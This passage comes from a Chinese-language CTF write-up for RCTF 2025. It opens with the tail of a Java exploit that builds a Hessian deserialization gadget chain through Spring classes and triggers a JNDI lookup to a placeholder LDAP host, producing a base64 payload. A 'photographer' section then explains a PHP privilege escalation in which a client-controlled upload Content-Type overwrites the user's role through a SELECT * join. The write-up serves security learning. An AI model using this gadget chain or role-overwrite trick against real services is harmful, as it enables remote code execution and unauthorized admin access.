</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// ldap url</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>url</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;ldap://xxxx:50389/4e13d5&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SimpleJndiBeanFactory</span><span class=w> </span><span class=n>beanFactory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>SimpleJndiBeanFactory</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//         String SimpleJndiBeanFactory = &#34;org.springframework.jndi.support.SimpleJndiBeanFactory&#34;;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//         SimpleJndiBeanFactory beanFactory = (SimpleJndiBeanFactory) Class.forName(SimpleJndiBeanFactory).getDeclaredConstructor(new Class[]{}).newInstance();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>beanFactory</span><span class=p>.</span><span class=na>setShareableResources</span><span class=p>(</span><span class=n>url</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>tboFactoryClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>tboFactoryConstructor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tboFactoryClass</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>BeanFactory</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>tboFactoryConstructor</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 将我们的 JNDI BeanFactory 和 JNDI URL 注入</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectFactory</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>objectFactory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>ObjectFactory</span><span class=o>&lt;?&gt;</span><span class=p>)</span><span class=w> </span><span class=n>tboFactoryConstructor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>beanFactory</span><span class=p>,</span><span class=w> </span><span class=n>url</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 3. 第二环：构造 ObjectFactoryDelegatingInvocationHandler</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 这个类是 AutowireUtils 的私有内部类，同样需要用反射</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>ofdihClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>ofdihConstructor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ofdihClass</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>ObjectFactory</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ofdihConstructor</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 将上一步构造的 ObjectFactory 注入</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InvocationHandler</span><span class=w> </span><span class=n>handler</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>InvocationHandler</span><span class=p>)</span><span class=w> </span><span class=n>ofdihConstructor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>objectFactory</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 4. 第一环：构造 Maybe Gadget</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Maybe</span><span class=w> </span><span class=n>maybeProxy</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Maybe</span><span class=p>(</span><span class=n>handler</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TreeMap</span><span class=o>&lt;</span><span class=n>Object</span><span class=p>,</span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>m</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TreeMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=w> </span><span class=s>&#34;size&#34;</span><span class=p>,</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=w> </span><span class=s>&#34;modCount&#34;</span><span class=p>,</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>nodeC</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.util.TreeMap$Entry&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=w> </span><span class=n>nodeCons</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>nodeC</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>nodeC</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>nodeCons</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>node</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>nodeCons</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=s>&#34;RoboTerh&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>right</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>nodeCons</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>maybeProxy</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=n>node</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>node</span><span class=p>,</span><span class=w> </span><span class=s>&#34;right&#34;</span><span class=p>,</span><span class=w> </span><span class=n>right</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=w> </span><span class=s>&#34;root&#34;</span><span class=p>,</span><span class=w> </span><span class=n>node</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>payload_base64</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>HessianFactory</span><span class=p>.</span><span class=na>serialize</span><span class=p>((</span><span class=n>Object</span><span class=p>)</span><span class=w> </span><span class=n>m</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;payload_base64: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>payload_base64</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        HessianFactory.deserialize(payload_base64);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFiled</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>classname</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>fieldname</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>aClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=n>classname</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>aClass</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>fieldname</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>o</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFieldValue</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>fieldName</span><span class=p>,</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>final</span><span class=w> </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getField</span><span class=p>(</span><span class=n>obj</span><span class=p>.</span><span class=na>getClass</span><span class=p>(),</span><span class=w> </span><span class=n>fieldName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Field</span><span class=w> </span><span class=nf>getField</span><span class=w> </span><span class=p>(</span><span class=kd>final</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>clazz</span><span class=p>,</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>fieldName</span><span class=w> </span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>clazz</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>fieldName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>clazz</span><span class=p>.</span><span class=na>getSuperclass</span><span class=p>()</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getField</span><span class=p>(</span><span class=n>clazz</span><span class=p>.</span><span class=na>getSuperclass</span><span class=p>(),</span><span class=w> </span><span class=n>fieldName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>NoSuchFieldException</span><span class=w> </span><span class=n>e</span><span class=w> </span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=o>!</span><span class=n>clazz</span><span class=p>.</span><span class=na>getSuperclass</span><span class=p>().</span><span class=na>equals</span><span class=p>(</span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w> </span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=n>getField</span><span class=p>(</span><span class=n>clazz</span><span class=p>.</span><span class=na>getSuperclass</span><span class=p>(),</span><span class=w> </span><span class=n>fieldName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=n>e</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><img src=/img/2025-RCTF/17.png alt=img></p><p>感谢出题师傅手下留情，俺做出来了，要是学了这么久的JAVA要是这次再爆0，俺真的会玉玉了</p><img src=/img/2025-RCTF/18.png alt=img width=40%><h2 id=photographer>photographer</h2><p>入口在 <code>public/index.php</code>，其中完成了框架加载、鉴权初始化以及路由分发。请求经过 Apache 的 <code>.htaccess</code> 重写进入该入口，随后由路由器将 URL 映射到控制器方法。入口代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=c1>// public/index.php
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>require_once</span> <span class=no>__DIR__</span> <span class=o>.</span> <span class=s1>&#39;/../app/config/autoload.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>Auth</span><span class=o>::</span><span class=na>init</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$router</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Router</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$routeLoader</span> <span class=o>=</span> <span class=k>require</span> <span class=no>__DIR__</span> <span class=o>.</span> <span class=s1>&#39;/../app/config/router.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$routeLoader</span><span class=p>(</span><span class=nv>$router</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$router</span><span class=o>-&gt;</span><span class=na>dispatch</span><span class=p>();</span>
</span></span></code></pre></td></tr></table></div></div><p>鉴权初始化的关键在 <code>Auth::init()</code>，它从会话中读取当前用户 ID 并去数据库查询用户对象。注意到，这个查询把用户表 <code>user</code> 与图片表 <code>photo</code> 做了连接，并且使用了 <code>SELECT *</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=c1>// app/middlewares/Auth.php
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>class</span> <span class=nc>Auth</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>static</span> <span class=nv>$user</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>init</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>session_status</span><span class=p>()</span> <span class=o>===</span> <span class=nx>PHP_SESSION_NONE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>session_name</span><span class=p>(</span><span class=nx>config</span><span class=p>(</span><span class=s1>&#39;session.name&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>self</span><span class=o>::</span><span class=nv>$user</span> <span class=o>=</span> <span class=nx>User</span><span class=o>::</span><span class=na>findById</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>type</span><span class=p>()</span> <span class=p>{</span> <span class=k>return</span> <span class=nx>self</span><span class=o>::</span><span class=nv>$user</span><span class=p>[</span><span class=s1>&#39;type&#39;</span><span class=p>];</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>把用户类型值与 <code>admin</code> 的值（为 0）进行“更小于”的比较。也就是说，只有类型值小于 0 的用户才被视为“超管”。这段代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=c1>// public/superadmin.php
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>Auth</span><span class=o>::</span><span class=na>init</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$user_types</span> <span class=o>=</span> <span class=nx>config</span><span class=p>(</span><span class=s1>&#39;user_types&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>Auth</span><span class=o>::</span><span class=na>check</span><span class=p>()</span> <span class=o>&amp;&amp;</span> <span class=nx>Auth</span><span class=o>::</span><span class=na>type</span><span class=p>()</span> <span class=o>&lt;</span> <span class=nv>$user_types</span><span class=p>[</span><span class=s1>&#39;admin&#39;</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>getenv</span><span class=p>(</span><span class=s1>&#39;FLAG&#39;</span><span class=p>)</span> <span class=o>?:</span> <span class=s1>&#39;RCTF{test_flag}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Location: /&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>再看角色值的配置，明确把 <code>admin</code> 定义为 0，<code>auditor</code> 为 1，<code>user</code> 为 2。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=c1>// app/config/config.php
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s1>&#39;user_types&#39;</span> <span class=o>=&gt;</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;admin&#39;</span> <span class=o>=&gt;</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;auditor&#39;</span> <span class=o>=&gt;</span> <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;user&#39;</span> <span class=o>=&gt;</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=p>],</span>
</span></span></code></pre></td></tr></table></div></div><p>如果仅有这两处，攻击者还无法改变自己的类型为负数。但是获取查询是有问题的。<code>User::findById</code> 将用户表与图片表通过 <code>LEFT JOIN</code> 连接，并且使用 <code>SELECT *</code>，这会把两张表的所有列合并成一个关联数组。</p><p>如果存在同名列，右表会覆盖左表。<code>user</code> 表有 <code>type</code>（用户角色），<code>photo</code> 表也有 <code>type</code>（图片 MIME 类型）。所以只要设置了背景图（<code>user.background_photo_id</code> 指向某张 <code>photo</code> 记录）之后，查询结果中的 <code>type</code> 字段就来自 <code>photo.type</code> 而不是 <code>user.type</code>。代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=c1>// app/models/User.php
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>findById</span><span class=p>(</span><span class=nv>$userId</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>DB</span><span class=o>::</span><span class=na>table</span><span class=p>(</span><span class=s1>&#39;user&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>-&gt;</span><span class=na>leftJoin</span><span class=p>(</span><span class=s1>&#39;photo&#39;</span><span class=p>,</span> <span class=s1>&#39;user.background_photo_id&#39;</span><span class=p>,</span> <span class=s1>&#39;=&#39;</span><span class=p>,</span> <span class=s1>&#39;photo.id&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>-&gt;</span><span class=na>where</span><span class=p>(</span><span class=s1>&#39;user.id&#39;</span><span class=p>,</span> <span class=s1>&#39;=&#39;</span><span class=p>,</span> <span class=nv>$userId</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>-&gt;</span><span class=na>first</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>Auth::type()</code> 实际上读取的是图片的 <code>type</code> 字段。只要我们能让某张图片的 <code>type</code> 变成一个“可被 PHP 比较为更小于 0 的值”，就能在 <code>superadmin.php</code> 中通过“超管”判断。</p><p>图片的 <code>type</code> 是从上传接口写入的，这个接口直接把 <code>$_FILES['type']</code> 原样存进数据库，而 <code>$_FILES['type']</code> 由请求中的 <code>multipart/form-data</code> 文件分段头的 <code>Content-Type</code> 决定，完全可由客户端控制：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=c1>// app/controllers/PhotoController.php
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$result</span> <span class=o>=</span> <span class=nx>Photo</span><span class=o>::</span><span class=na>create</span><span class=p>([</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;user_id&#39;</span> <span class=o>=&gt;</span> <span class=nx>Auth</span><span class=o>::</span><span class=na>id</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;original_filename&#39;</span> <span class=o>=&gt;</span> <span class=nv>$file</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;saved_filename&#39;</span> <span class=o>=&gt;</span> <span class=nv>$savedFilename</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;type&#39;</span> <span class=o>=&gt;</span> <span class=nv>$file</span><span class=p>[</span><span class=s1>&#39;type&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;size&#39;</span> <span class=o>=&gt;</span> <span class=nv>$file</span><span class=p>[</span><span class=s1>&#39;size&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=o>...</span>
</span></span><span class=line><span class=cl><span class=p>]);</span>
